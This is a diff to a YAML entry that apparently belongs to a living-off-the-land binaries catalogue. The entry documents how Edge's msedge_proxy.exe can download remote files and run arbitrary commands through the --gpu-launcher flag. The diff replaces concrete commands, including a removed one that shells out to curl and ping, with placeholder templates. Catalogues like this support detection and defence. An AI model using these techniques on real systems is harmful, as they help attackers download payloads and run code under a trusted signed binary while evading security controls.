@@ -6,21 +6,14 @@ Description: Microsoft Edge Browser
 Author: 'Mert Daş'
 Created: 2023-08-18
 Commands:
-  - Command: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe http://example.com/test.zip"
+  - Command: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}"
     Description: msedge_proxy will download malicious file.
     Usecase: Download file from the internet
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
-  - Command: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\cmd.exe /c curl ipinfo.io/json --output %USERPROFILE%\\\\Desktop\\\\test.json &&\""
-    Description: Edge will silently download the file.
-    Usecase: Download file from the internet
-    Category: Download
-    Privileges: User
-    MitreID: T1105
-    OperatingSystem: Windows 10, Windows 11
-  - Command: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\cmd.exe /c ping google.com &&\""
+  - Command: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
     Description: msedge_proxy.exe will execute file in the background
     Usecase: Executes a process under a trusted Microsoft signed binary
     Category: Execute
